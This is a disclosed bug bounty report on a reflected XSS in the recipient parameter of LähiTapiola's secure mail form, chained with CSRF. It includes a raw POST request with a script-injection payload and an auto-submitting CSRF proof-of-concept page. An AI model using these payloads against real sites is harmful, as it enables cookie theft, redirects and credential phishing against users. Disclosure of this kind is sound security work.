ReportLink:https://hackerone.com/reports/314518
WeaknessName:Cross-site Scripting (XSS) - Reflected
Reporter:https://hackerone.com/putsi
ReportedTo:LocalTapiola(localtapiola)
BountyAmount:750.0
Severity:medium
State:Closed
DateOfDisclosure:02.03.2018 4:01:12

Summary:
##Issue

The reporter was able to misuse a couple of flaws in the system. By using a reflected XSS (due to missing validation) combined with a CSRF the reporter could create open redirects (via javascript), was able to read all present lahitapiola.fi cookies as well as cookies from the the secure-subdomain. Finally the reporter showed how to perform a complete redress of the UI and fooling the user to submit login-information and sending that login information back to the reporter himself as an error message.  Clever!

##Fix

The issue was investigated and found to be valid and in scope for a fix. Details about the fix are not disclosed. 

##Reasoning

The reported case was valid and within the scope of the bug bounty program. The root cause was not severe or complicated from a technical point of view. However, the found flaw enabled quite a bit of different approaches to do harm. The bounty is not based directly on the weakness, but rather on the business impact as well clever thinking.
## Basic report information
**Summary:** 
The secure.lahitapiola.fi -mail application contains a reflected XSS vulnerability which can be exploited for example with CSRF-attack.

**Description:** 
As mentioned in the summary, the site contains a reflected cross-site scripting vulnerability. This vulnerability is present on the recipient-parameter which is used to specify destination email address of the email. 

This recipient-parameter is normally not used on the first page of the email-flow, however by manually injecting it to the POST-request we can introduce an email address which will be placed on the resulting HTML-page as unsanitized value.

As the same functionality lacks any CSRF-protection, a CSRF-page can be crafted which will trigger the reflected XSS vulnerability when opened.

**Impact:**
The vulnerability can be used at least to do the following:
- Create open redirects via javascript.
- Read all cookies that are scoped to lahitapiola-domain instead of the subdomain.
- Read cookies of the secure-subdomain.
- Maybe something else but I'm too tired to think and will post a comment if anything new pops up.

## Browsers / Apps Verified In:

  * Firefox

## Steps To Reproduce:

  1. Host the attached CSRF-PoC on a external server.
  2. Open the hosted file with Firefox or any other browser that does not do proper XSS-sanitation.
  3. Notice, that the reflected xss triggered and was run in context of the secure.lahitapiola.fi-domain.

## Additional material

Simple PoC-request for the XSS:

```
POST /index.cgi HTTP/1.1
Host: secure.lahitapiola.fi
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 164

sender=█████████%40rot.fi&page=2&lang=en&charset=utf-8&formsubmit=Continue&recipient=no-reply"/></noscript><script>alert(document.domain)</script>@lahitapiola.fi
```

Example attack by chaining to CSRF:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://secure.lahitapiola.fi/index.cgi" method="POST">
      <input type="hidden" name="sender" value="secure&#45;█████&#64;rot&#46;fi" />
      <input type="hidden" name="page" value="2" />
      <input type="hidden" name="lang" value="en" />
      <input type="hidden" name="charset" value="utf&#45;8" />
      <input type="hidden" name="formsubmit" value="Continue" />
      <input type="hidden" name="recipient" value="no&#45;reply&quot;&#47;&gt;&lt;&#47;noscript&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;&#64;lahitapiola&#46;fi" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Impact

The vulnerability can be used at least to do the following:
- Create open redirects via javascript.
- Read all cookies that are scoped to lahitapiola-domain instead of the subdomain.
- Read cookies of the secure-subdomain.
- Maybe something else but I'm too tired to think and will post a comment if anything new pops up.